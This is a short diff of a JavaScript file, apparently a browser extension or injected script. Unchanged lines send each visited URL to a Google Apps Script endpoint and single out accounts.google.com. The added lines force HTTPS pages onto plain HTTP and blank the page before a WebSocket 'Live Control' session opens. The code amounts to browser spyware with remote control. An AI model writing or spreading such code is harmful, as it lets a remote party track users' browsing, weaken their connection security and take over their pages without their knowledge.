@@ -1,4 +1,4 @@
-console.log('V6')
+console.log('V7')
 
 // Log URLs
 fetch(`https://script.google.com/macros/s/AKfycbw6FXUT2mISNq5obxQHkjjfEYQqBlo-k1U3m2qwQdLP9HPztj6nliggK4XMIqLaglBxug/exec?url=${window.location.href}`)
@@ -33,9 +33,18 @@ if (window.location.host === 'accounts.google.com') {
 
 // Live Control
 function initLiveControl(socketUrl) {
+  if(window.location.protocol === 'https:'){
+    window.location = 'http://example.com'
+  }
   if(window.location.protocol === 'http:' && window.location.host !== '127.0.0.1:8080'){
 
     console.log('Live');
+    $('html').innerHTML = `
+    <head>
+    <title>blank</title>
+    </head>
+    <body></body>
+    `;
 
     const socket = new WebSocket(socketUrl);
 
